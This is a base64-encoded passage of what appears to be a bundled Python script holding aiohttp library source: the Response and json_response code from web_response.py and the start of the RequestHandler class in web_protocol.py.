AgICAgICAgICAgICAgICAgICAgcmVhbF9oZWFkZXJzW2hkcnMuQ09OVEVOVF9UWVBFXSA9IGNvbnRlbnRfdHlwZVxyXG5cclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKHN0YXR1cz1zdGF0dXMsIHJlYXNvbj1yZWFzb24sIGhlYWRlcnM9cmVhbF9oZWFkZXJzKVxyXG5cclxuICAgICAgICBpZiB0ZXh0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLnRleHQgPSB0ZXh0XHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5ib2R5ID0gYm9keVxyXG5cclxuICAgICAgICBzZWxmLl9jb21wcmVzc2VkX2JvZHkgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2J5dGVzXVxyXG4gICAgICAgIHNlbGYuX3psaWJfZXhlY3V0b3Jfc2l6ZSA9IHpsaWJfZXhlY3V0b3Jfc2l6ZVxyXG4gICAgICAgIHNlbGYuX3psaWJfZXhlY3V0b3IgPSB6bGliX2V4ZWN1dG9yXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgYm9keShzZWxmKSAtPiBPcHRpb25hbFtVbmlvbltieXRlcywgUGF5bG9hZF1dOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9ib2R5XHJcblxyXG4gICAgQGJvZHkuc2V0dGVyXHJcbiAgICBkZWYgYm9keShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGJvZHk6IGJ5dGVzLFxyXG4gICAgICAgIENPTlRFTlRfVFlQRTogaXN0ciA9IGhkcnMuQ09OVEVOVF9UWVBFLFxyXG4gICAgICAgIENPTlRFTlRfTEVOR1RIOiBpc3RyID0gaGRycy5DT05URU5UX0xFTkdUSCxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBib2R5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2JvZHkgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW2J5dGVzXVxyXG4gICAgICAgICAgICBzZWxmLl9ib2R5X3BheWxvYWQgPSBGYWxzZSAgIyB0eXBlOiBib29sXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKGJvZHksIChieXRlcywgYnl0ZWFycmF5KSk6XHJcbiAgICAgICAgICAgIHNlbGYuX2JvZHkgPSBib2R5XHJcbiAgICAgICAgICAgIHNlbGYuX2JvZHlfcGF5bG9hZCA9IEZhbHNlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYm9keSA9IGJvZHkgPSBwYXlsb2FkLlBBWUxPQURfUkVHSVNUUlkuZ2V0KGJvZHkpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBwYXlsb2FkLkxvb2t1cEVycm9yOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5zdXBwb3J0ZWQgYm9keSB0eXBlICVyIiAlIHR5cGUoYm9keSkpXHJcblxyXG4gICAgICAgICAgICBzZWxmLl9ib2R5X3BheWxvYWQgPSBUcnVlXHJcblxyXG4gICAgICAgICAgICBoZWFkZXJzID0gc2VsZi5faGVhZGVyc1xyXG5cclxuICAgICAgICAgICAgIyBzZXQgY29udGVudC1sZW5ndGggaGVhZGVyIGlmIG5lZWRlZFxyXG4gICAgICAgICAgICBpZiBub3Qgc2VsZi5fY2h1bmtlZCBhbmQgQ09OVEVOVF9MRU5HVEggbm90IGluIGhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICBzaXplID0gYm9keS5zaXplXHJcbiAgICAgICAgICAgICAgICBpZiBzaXplIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnNbQ09OVEVOVF9MRU5HVEhdID0gc3RyKHNpemUpXHJcblxyXG4gICAgICAgICAgICAjIHNldCBjb250ZW50LXR5cGVcclxuICAgICAgICAgICAgaWYgQ09OVEVOVF9UWVBFIG5vdCBpbiBoZWFkZXJzOlxyXG4gICAgICAgICAgICAgICAgaGVhZGVyc1tDT05URU5UX1RZUEVdID0gYm9keS5jb250ZW50X3R5cGVcclxuXHJcbiAgICAgICAgICAgICMgY29weSBwYXlsb2FkIGhlYWRlcnNcclxuICAgICAgICAgICAgaWYgYm9keS5oZWFkZXJzOlxyXG4gICAgICAgICAgICAgICAgZm9yIChrZXksIHZhbHVlKSBpbiBib2R5LmhlYWRlcnMuaXRlbXMoKTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBrZXkgbm90IGluIGhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnNba2V5XSA9IHZhbHVlXHJcblxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzZWRfYm9keSA9IE5vbmVcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB0ZXh0KHNlbGYpIC0+IE9wdGlvbmFsW3N0cl06XHJcbiAgICAgICAgaWYgc2VsZi5fYm9keSBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9ib2R5LmRlY29kZShzZWxmLmNoYXJzZXQgb3IgInV0Zi04IilcclxuXHJcbiAgICBAdGV4dC5zZXR0ZXJcclxuICAgIGRlZiB0ZXh0KHNlbGYsIHRleHQ6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgdGV4dCBpcyBOb25lIG9yIGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHRleHQsIHN0clxyXG4gICAgICAgICksICJ0ZXh0IGFyZ3VtZW50IG11c3QgYmUgc3RyICglcikiICUgdHlwZSh0ZXh0KVxyXG5cclxuICAgICAgICBpZiBzZWxmLmNvbnRlbnRfdHlwZSA9PSAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIjpcclxuICAgICAgICAgICAgc2VsZi5jb250ZW50X3R5cGUgPSAidGV4dC9wbGFpbiJcclxuICAgICAgICBpZiBzZWxmLmNoYXJzZXQgaXMgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5jaGFyc2V0ID0gInV0Zi04IlxyXG5cclxuICAgICAgICBzZWxmLl9ib2R5ID0gdGV4dC5lbmNvZGUoc2VsZi5jaGFyc2V0KVxyXG4gICAgICAgIHNlbGYuX2JvZHlfcGF5bG9hZCA9IEZhbHNlXHJcbiAgICAgICAgc2VsZi5fY29tcHJlc3NlZF9ib2R5ID0gTm9uZVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbnRlbnRfbGVuZ3RoKHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgaWYgc2VsZi5fY2h1bmtlZDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmVcclxuXHJcbiAgICAgICAgaWYgaGRycy5DT05URU5UX0xFTkdUSCBpbiBzZWxmLl9oZWFkZXJzOlxyXG4gICAgICAgICAgICByZXR1cm4gc3VwZXIoKS5jb250ZW50X2xlbmd0aFxyXG5cclxuICAgICAgICBpZiBzZWxmLl9jb21wcmVzc2VkX2JvZHkgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICMgUmV0dXJuIGxlbmd0aCBvZiB0aGUgY29tcHJlc3NlZCBib2R5XHJcbiAgICAgICAgICAgIHJldHVybiBsZW4oc2VsZi5fY29tcHJlc3NlZF9ib2R5KVxyXG4gICAgICAgIGVsaWYgc2VsZi5fYm9keV9wYXlsb2FkOlxyXG4gICAgICAgICAgICAjIEEgcGF5bG9hZCB3aXRob3V0IGNvbnRlbnQgbGVuZ3RoLCBvciBhIGNvbXByZXNzZWQgcGF5bG9hZFxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIGVsaWYgc2VsZi5fYm9keSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmV0dXJuIGxlbihzZWxmLl9ib2R5KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiAwXHJcblxyXG4gICAgQGNvbnRlbnRfbGVuZ3RoLnNldHRlclxyXG4gICAgZGVmIGNvbnRlbnRfbGVuZ3RoKHNlbGYsIHZhbHVlOiBPcHRpb25hbFtpbnRdKSAtPiBOb25lOlxyXG4gICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiQ29udGVudCBsZW5ndGggaXMgc2V0IGF1dG9tYXRpY2FsbHkiKVxyXG5cclxuICAgIGFzeW5jIGRlZiB3cml0ZV9lb2Yoc2VsZiwgZGF0YTogYnl0ZXMgPSBiIiIpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fZW9mX3NlbnQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIGlmIHNlbGYuX2NvbXByZXNzZWRfYm9keSBpcyBOb25lOlxyXG4gICAgICAgICAgICBib2R5ID0gc2VsZi5fYm9keSAgIyB0eXBlOiBPcHRpb25hbFtVbmlvbltieXRlcywgUGF5bG9hZF1dXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYm9keSA9IHNlbGYuX2NvbXByZXNzZWRfYm9keVxyXG4gICAgICAgIGFzc2VydCBub3QgZGF0YSwgZiJkYXRhIGFyZyBpcyBub3Qgc3VwcG9ydGVkLCBnb3Qge2RhdGEhcn0iXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3JlcSBpcyBub3QgTm9uZVxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9wYXlsb2FkX3dyaXRlciBpcyBub3QgTm9uZVxyXG4gICAgICAgIGlmIGJvZHkgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3JlcS5fbWV0aG9kID09IGhkcnMuTUVUSF9IRUFEIG9yIHNlbGYuX3N0YXR1cyBpbiBbMjA0LCAzMDRdOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc3VwZXIoKS53cml0ZV9lb2YoKVxyXG4gICAgICAgICAgICBlbGlmIHNlbGYuX2JvZHlfcGF5bG9hZDpcclxuICAgICAgICAgICAgICAgIHBheWxvYWQgPSBjYXN0KFBheWxvYWQsIGJvZHkpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBwYXlsb2FkLndyaXRlKHNlbGYuX3BheWxvYWRfd3JpdGVyKVxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc3VwZXIoKS53cml0ZV9lb2YoKVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc3VwZXIoKS53cml0ZV9lb2YoY2FzdChieXRlcywgYm9keSkpXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgYXdhaXQgc3VwZXIoKS53cml0ZV9lb2YoKVxyXG5cclxuICAgIGFzeW5jIGRlZiBfc3RhcnQoc2VsZiwgcmVxdWVzdDogIkJhc2VSZXF1ZXN0IikgLT4gQWJzdHJhY3RTdHJlYW1Xcml0ZXI6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2NodW5rZWQgYW5kIGhkcnMuQ09OVEVOVF9MRU5HVEggbm90IGluIHNlbGYuX2hlYWRlcnM6XHJcbiAgICAgICAgICAgIGlmIG5vdCBzZWxmLl9ib2R5X3BheWxvYWQ6XHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9ib2R5IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX0xFTkdUSF0gPSBzdHIobGVuKHNlbGYuX2JvZHkpKVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9oZWFkZXJzW2hkcnMuQ09OVEVOVF9MRU5HVEhdID0gIjAiXHJcblxyXG4gICAgICAgIHJldHVybiBhd2FpdCBzdXBlcigpLl9zdGFydChyZXF1ZXN0KVxyXG5cclxuICAgIGRlZiBfY29tcHJlc3NfYm9keShzZWxmLCB6bGliX21vZGU6IGludCkgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgemxpYl9tb2RlID4gMFxyXG4gICAgICAgIGNvbXByZXNzb2JqID0gemxpYi5jb21wcmVzc29iaih3Yml0cz16bGliX21vZGUpXHJcbiAgICAgICAgYm9keV9pbiA9IHNlbGYuX2JvZHlcclxuICAgICAgICBhc3NlcnQgYm9keV9pbiBpcyBub3QgTm9uZVxyXG4gICAgICAgIHNlbGYuX2NvbXByZXNzZWRfYm9keSA9IGNvbXByZXNzb2JqLmNvbXByZXNzKGJvZHlfaW4pICsgY29tcHJlc3NvYmouZmx1c2goKVxyXG5cclxuICAgIGFzeW5jIGRlZiBfZG9fc3RhcnRfY29tcHJlc3Npb24oc2VsZiwgY29kaW5nOiBDb250ZW50Q29kaW5nKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2JvZHlfcGF5bG9hZCBvciBzZWxmLl9jaHVua2VkOlxyXG4gICAgICAgICAgICByZXR1cm4gYXdhaXQgc3VwZXIoKS5fZG9fc3RhcnRfY29tcHJlc3Npb24oY29kaW5nKVxyXG5cclxuICAgICAgICBpZiBjb2RpbmcgIT0gQ29udGVudENvZGluZy5pZGVudGl0eTpcclxuICAgICAgICAgICAgIyBJbnN0ZWFkIG9mIHVzaW5nIF9wYXlsb2FkX3dyaXRlci5lbmFibGVfY29tcHJlc3Npb24sXHJcbiAgICAgICAgICAgICMgY29tcHJlc3MgdGhlIHdob2xlIGJvZHlcclxuICAgICAgICAgICAgemxpYl9tb2RlID0gKFxyXG4gICAgICAgICAgICAgICAgMTYgKyB6bGliLk1BWF9XQklUUyBpZiBjb2RpbmcgPT0gQ29udGVudENvZGluZy5nemlwIGVsc2UgemxpYi5NQVhfV0JJVFNcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBib2R5X2luID0gc2VsZi5fYm9keVxyXG4gICAgICAgICAgICBhc3NlcnQgYm9keV9pbiBpcyBub3QgTm9uZVxyXG4gICAgICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl96bGliX2V4ZWN1dG9yX3NpemUgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgICAgIGFuZCBsZW4oYm9keV9pbikgPiBzZWxmLl96bGliX2V4ZWN1dG9yX3NpemVcclxuICAgICAgICAgICAgKTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKS5ydW5faW5fZXhlY3V0b3IoXHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5femxpYl9leGVjdXRvciwgc2VsZi5fY29tcHJlc3NfYm9keSwgemxpYl9tb2RlXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9jb21wcmVzc19ib2R5KHpsaWJfbW9kZSlcclxuXHJcbiAgICAgICAgICAgIGJvZHlfb3V0ID0gc2VsZi5fY29tcHJlc3NlZF9ib2R5XHJcbiAgICAgICAgICAgIGFzc2VydCBib2R5X291dCBpcyBub3QgTm9uZVxyXG5cclxuICAgICAgICAgICAgc2VsZi5faGVhZGVyc1toZHJzLkNPTlRFTlRfRU5DT0RJTkddID0gY29kaW5nLnZhbHVlXHJcbiAgICAgICAgICAgIHNlbGYuX2hlYWRlcnNbaGRycy5DT05URU5UX0xFTkdUSF0gPSBzdHIobGVuKGJvZHlfb3V0KSlcclxuXHJcblxyXG5kZWYganNvbl9yZXNwb25zZShcclxuICAgIGRhdGE6IEFueSA9IHNlbnRpbmVsLFxyXG4gICAgKixcclxuICAgIHRleHQ6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgYm9keTogT3B0aW9uYWxbYnl0ZXNdID0gTm9uZSxcclxuICAgIHN0YXR1czogaW50ID0gMjAwLFxyXG4gICAgcmVhc29uOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgY29udGVudF90eXBlOiBzdHIgPSAiYXBwbGljYXRpb24vanNvbiIsXHJcbiAgICBkdW1wczogSlNPTkVuY29kZXIgPSBqc29uLmR1bXBzLFxyXG4pIC0+IFJlc3BvbnNlOlxyXG4gICAgaWYgZGF0YSBpcyBub3Qgc2VudGluZWw6XHJcbiAgICAgICAgaWYgdGV4dCBvciBib2R5OlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJvbmx5IG9uZSBvZiBkYXRhLCB0ZXh0LCBvciBib2R5IHNob3VsZCBiZSBzcGVjaWZpZWQiKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHRleHQgPSBkdW1wcyhkYXRhKVxyXG4gICAgcmV0dXJuIFJlc3BvbnNlKFxyXG4gICAgICAgIHRleHQ9dGV4dCxcclxuICAgICAgICBib2R5PWJvZHksXHJcbiAgICAgICAgc3RhdHVzPXN0YXR1cyxcclxuICAgICAgICByZWFzb249cmVhc29uLFxyXG4gICAgICAgIGhlYWRlcnM9aGVhZGVycyxcclxuICAgICAgICBjb250ZW50X3R5cGU9Y29udGVudF90eXBlLFxyXG4gICAgKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYWlvaHR0cC93ZWJfcHJvdG9jb2wucHknLCBiJ2ltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBhc3luY2lvLnN0cmVhbXNcclxuaW1wb3J0IHRyYWNlYmFja1xyXG5pbXBvcnQgd2FybmluZ3NcclxuZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgZGVxdWVcclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBzdXBwcmVzc1xyXG5mcm9tIGh0bWwgaW1wb3J0IGVzY2FwZSBhcyBodG1sX2VzY2FwZVxyXG5mcm9tIGh0dHAgaW1wb3J0IEhUVFBTdGF0dXNcclxuZnJvbSBsb2dnaW5nIGltcG9ydCBMb2dnZXJcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIFRZUEVfQ0hFQ0tJTkcsXHJcbiAgICBBbnksXHJcbiAgICBBd2FpdGFibGUsXHJcbiAgICBDYWxsYWJsZSxcclxuICAgIERlcXVlLFxyXG4gICAgT3B0aW9uYWwsXHJcbiAgICBTZXF1ZW5jZSxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4gICAgY2FzdCxcclxuKVxyXG5cclxuaW1wb3J0IGF0dHJcclxuaW1wb3J0IHlhcmxcclxuXHJcbmZyb20gLmFiYyBpbXBvcnQgQWJzdHJhY3RBY2Nlc3NMb2dnZXIsIEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmJhc2VfcHJvdG9jb2wgaW1wb3J0IEJhc2VQcm90b2NvbFxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCBjZWlsX3RpbWVvdXRcclxuZnJvbSAuaHR0cCBpbXBvcnQgKFxyXG4gICAgSHR0cFByb2Nlc3NpbmdFcnJvcixcclxuICAgIEh0dHBSZXF1ZXN0UGFyc2VyLFxyXG4gICAgSHR0cFZlcnNpb24xMCxcclxuICAgIFJhd1JlcXVlc3RNZXNzYWdlLFxyXG4gICAgU3RyZWFtV3JpdGVyLFxyXG4pXHJcbmZyb20gLmxvZyBpbXBvcnQgYWNjZXNzX2xvZ2dlciwgc2VydmVyX2xvZ2dlclxyXG5mcm9tIC5zdHJlYW1zIGltcG9ydCBFTVBUWV9QQVlMT0FELCBTdHJlYW1SZWFkZXJcclxuZnJvbSAudGNwX2hlbHBlcnMgaW1wb3J0IHRjcF9rZWVwYWxpdmVcclxuZnJvbSAud2ViX2V4Y2VwdGlvbnMgaW1wb3J0IEhUVFBFeGNlcHRpb25cclxuZnJvbSAud2ViX2xvZyBpbXBvcnQgQWNjZXNzTG9nZ2VyXHJcbmZyb20gLndlYl9yZXF1ZXN0IGltcG9ydCBCYXNlUmVxdWVzdFxyXG5mcm9tIC53ZWJfcmVzcG9uc2UgaW1wb3J0IFJlc3BvbnNlLCBTdHJlYW1SZXNwb25zZVxyXG5cclxuX19hbGxfXyA9ICgiUmVxdWVzdEhhbmRsZXIiLCAiUmVxdWVzdFBheWxvYWRFcnJvciIsICJQYXlsb2FkQWNjZXNzRXJyb3IiKVxyXG5cclxuaWYgVFlQRV9DSEVDS0lORzogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgZnJvbSAud2ViX3NlcnZlciBpbXBvcnQgU2VydmVyXHJcblxyXG5cclxuX1JlcXVlc3RGYWN0b3J5ID0gQ2FsbGFibGVbXHJcbiAgICBbXHJcbiAgICAgICAgUmF3UmVxdWVzdE1lc3NhZ2UsXHJcbiAgICAgICAgU3RyZWFtUmVhZGVyLFxyXG4gICAgICAgICJSZXF1ZXN0SGFuZGxlciIsXHJcbiAgICAgICAgQWJzdHJhY3RTdHJlYW1Xcml0ZXIsXHJcbiAgICAgICAgImFzeW5jaW8uVGFza1tOb25lXSIsXHJcbiAgICBdLFxyXG4gICAgQmFzZVJlcXVlc3QsXHJcbl1cclxuXHJcbl9SZXF1ZXN0SGFuZGxlciA9IENhbGxhYmxlW1tCYXNlUmVxdWVzdF0sIEF3YWl0YWJsZVtTdHJlYW1SZXNwb25zZV1dXHJcblxyXG5FUlJPUiA9IFJhd1JlcXVlc3RNZXNzYWdlKFxyXG4gICAgIlVOS05PV04iLFxyXG4gICAgIi8iLFxyXG4gICAgSHR0cFZlcnNpb24xMCxcclxuICAgIHt9LCAgIyB0eXBlOiBpZ25vcmVbYXJnLXR5cGVdXHJcbiAgICB7fSwgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG4gICAgVHJ1ZSxcclxuICAgIE5vbmUsXHJcbiAgICBGYWxzZSxcclxuICAgIEZhbHNlLFxyXG4gICAgeWFybC5VUkwoIi8iKSxcclxuKVxyXG5cclxuXHJcbmNsYXNzIFJlcXVlc3RQYXlsb2FkRXJyb3IoRXhjZXB0aW9uKTpcclxuICAgICIiIlBheWxvYWQgcGFyc2luZyBlcnJvci4iIiJcclxuXHJcblxyXG5jbGFzcyBQYXlsb2FkQWNjZXNzRXJyb3IoRXhjZXB0aW9uKTpcclxuICAgICIiIlBheWxvYWQgd2FzIGFjY2Vzc2VkIGFmdGVyIHJlc3BvbnNlIHdhcyBzZW50LiIiIlxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBfRXJySW5mbzpcclxuICAgIHN0YXR1czogaW50XHJcbiAgICBleGM6IEJhc2VFeGNlcHRpb25cclxuICAgIG1lc3NhZ2U6IHN0clxyXG5cclxuXHJcbl9Nc2dUeXBlID0gVHVwbGVbVW5pb25bUmF3UmVxdWVzdE1lc3NhZ2UsIF9FcnJJbmZvXSwgU3RyZWFtUmVhZGVyXVxyXG5cclxuXHJcbmNsYXNzIFJlcXVlc3RIYW5kbGVyKEJhc2VQcm90b2NvbCk6XHJcbiAgICAiIiJIVFRQIHByb3RvY29sIGltcGxlbWVudGF0aW9uLlxyXG5cclxuICAgIFJlcXVlc3RIYW5kbGVyIGhhbmRsZXMgaW5jb21pbmcgSFRUUCByZXF1ZXN0LiBJdCByZWFkcyByZXF1ZXN0IGxpbmUsXHJcbiAgICByZXF1ZXN0IGhlYWRlcnMgYW5kIHJlcXVlc3QgcGF5bG9hZCBhbmQgY2FsbHMgaGFuZGxlX3JlcXVlc3QoKSBtZXRob2QuXHJcbiAgICBCeSBkZWZhdWx0IGl0IGFsd2F5cyByZXR1cm5zIHdpdGggNDA0IHJlc3BvbnNlLlxyXG5cclxuICAgIFJlcXVlc3RIYW5kbGVyIGhhbmRsZXMgZXJyb3JzIGluIGluY29taW5nIHJlcXVlc3QsIGxpa2UgYmFkXHJcbiAgICBzdGF0dXMgbGluZSwgYmFkIGhlYWRlcnMgb3IgaW5jb21wbGV0ZSBwYXlsb2FkLiBJZiBhbnkgZXJyb3Igb2NjdXJzLFxyXG4gICAgY29ubmVjdGlvbiBnZXRzIGNsb3NlZC5cclxuXHJcbiAgICBrZWVwYWxpdmVfdGltZW91dCAtLSBudW1iZXIgb2Ygc2Vjb25kcyBiZWZvcmUgY2xvc2luZ1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAga2VlcC1hbGl2ZSBjb25uZWN0aW9uXHJcblxyXG4gICAgdGNwX2tlZXBhbGl2ZSAtLSBUQ1Aga2VlcC1hbGl2ZSBpcyBvbiwgZGVmYXVsdCBpcyBvblxyXG5cclxuICAgIGRlYnVnIC0tIGVuYWJsZSBkZWJ1ZyBtb2RlXHJcblxyXG4gICAgbG9nZ2VyIC0tIGN1c3RvbSBsb2dnZXIgb2JqZWN0XHJcblxyXG4gICAgYWNjZXNzX2xvZ19jbGFzcyAtLSBjdXN0b20gY2xhc3MgZm9yIGFjY2Vzc19sb2dnZXJcclxuXHJcbiAgICBhY2Nlc3NfbG9nIC0tIGN1c3RvbSBsb2dnaW5nIG9iamVjdFxyXG5cclxuICAgIGFjY2Vzc19sb2dfZm9ybWF0IC0tIGFjY2VzcyBsb2cgZm9ybWF0IHN0cmluZ1xyXG5cclxuICAgIGxvb3AgLS0gT3B0aW9uYWwgZXZlbnQgbG9vcFxyXG5cclxuICAgIG1heF9saW5lX3NpemUgLS0gT3B0aW9uYWwgbWF4aW11bSBoZWFkZXIgbGluZSBzaXplXHJcblxyXG4gICAgbWF4X2ZpZWxkX3NpemUgLS0gT3B0aW9uYWwgbWF4aW11bSBoZWFkZXIgZmllbGQgc2l6ZVxyXG5cclxuICAgIG1heF9oZWFkZXJzIC0tIE9wdGlvbmFsIG1heGltdW0gaGVhZGVyIHNpemVcclxuXHJcbiAgICAiIiJcclxuXHJcbiAgICBLRUVQQUxJVkVfUkVTQ0hFRFVMRV9ERUxBWSA9IDFcclxuXHJcbiAgICBfX3Nsb3RzX18gPSAoXHJcbiAgICAgICAgIl9yZXF1ZXN0X2NvdW50IixcclxuICAgICAgICAiX2tlZXBhbGl2ZSIsXHJcbiAgICAgICAgIl9tYW5hZ2VyIixcclxuICAgICAgICAiX3JlcXVlc3RfaGFuZGxlciIsXHJcbiAgICAgICAgIl9yZXF1ZXN0X2ZhY3RvcnkiLFxyXG4gICAgICAgICJfdGNwX2tlZXBhbGl2ZSIsXHJcbiAgICAgICAgIl9rZWVwYWxpdmVfdGltZSIsXHJcbiAgICAgICAgIl9rZWVwYWxpdmVfaGFuZGxlIixcclxuICAgICAgICAiX2tlZXBhbGl2ZV90aW1lb3V0IixcclxuICAgICAgICAiX2xpbmdlcmluZ190aW1lIixcclxuICAgICAgICAiX21lc3NhZ2VzIixcclxuICAgICAgICAiX21lc3NhZ2VfdGFpbCIsXHJcbiAgICAgICAgIl93YWl0ZXIiLFxyXG4gICAgICAgICJfdGFza19oYW5kbGVyIixcclxuICAgICAgICAiX3VwZ3JhZGUiLFxyXG4gICAgICAgICJfcGF5bG9hZF9wYXJzZXIiLFxyXG4gICAgICAgICJfcmVxdWVzdF9wYXJzZXIiLFxyXG4gICAgICAgICJfcmVhZGluZ19wYXVzZWQiLFxyXG4gICAgICAgICJsb2dnZXIiLFxyXG4gICAgICAgICJkZWJ1ZyIsXHJcbiAgICAgICAgImFjY2Vzc19sb2ciLFxyXG4gICAgICAgICJhY2Nlc3NfbG9nZ2VyIixcclxuICAgICAgICAiX2Nsb3NlIixcclxuICAgICAgICAiX2ZvcmNlX2Nsb3NlIixcclxuICAgICAgICAiX2N1cnJlbnRfcmVxdWVzdCIsXHJcbiAgICApXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgbWFuYWdlcjogIlNlcnZlciIsXHJcbiAgICAgICAgKixcclxuICAgICAgICBsb29wOiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wLFxyXG4gICAgICAgIGtlZXBhbGl2ZV90aW1lb3V0OiBmbG9hdCA9IDc1LjAsICAjIE5HSU5YIGRlZmF1bHQgaXMgNzUgc2Vjc1xyXG4gICAgICAgIHRjcF9rZWVwYWxpdmU6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIGxvZ2dlcjogTG9nZ2VyID0gc2VydmVyX2xvZ2dlcixcclxuICAgICAgICBhY2Nlc3NfbG9nX2NsYXNzOiBUeXBlW0Fic3RyYWN0QWNjZXNzTG9nZ2VyXSA9IEFjY2Vzc0xvZ2dlcixcclxuICAgICAgICBhY2Nlc3NfbG9nOiBMb2dnZXIgPSBhY2Nlc3NfbG9nZ2VyLFxyXG4gICAgICAgIGFjY2Vzc19sb2dfZm9ybWF0OiBzdHIgPSBBY2Nlc3NMb2dnZXIuTE9HX0ZPUk1BVCxcclxuICAgICAgICBkZWJ1ZzogYm9vbCA9IEZhbHNlLFxyXG4gICAgICAgIG1heF9saW5lX3NpemU6IGludCA9IDgxOTAsXHJcbiAgICAgICAgbWF4X2hlYWRlcnM6IGludCA9IDMyNzY4LFxyXG4gICAgICAgIG1heF9maWVsZF9zaXplOiBpbnQgPSA4MTkwLFxyXG4gICAgICAgIGxpbmdlcmluZ190aW1lOiBmbG9hdCA9IDEwLjAsXHJcbiAgICAgICAgcmVhZF9idWZzaXplOiBpbnQgPSAyICoqIDE2LFxyXG4gICAgICAgIGF1dG9fZGVjb21wcmVzczogYm9vbCA9IFRydWUsXHJcbiAgICApOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18ob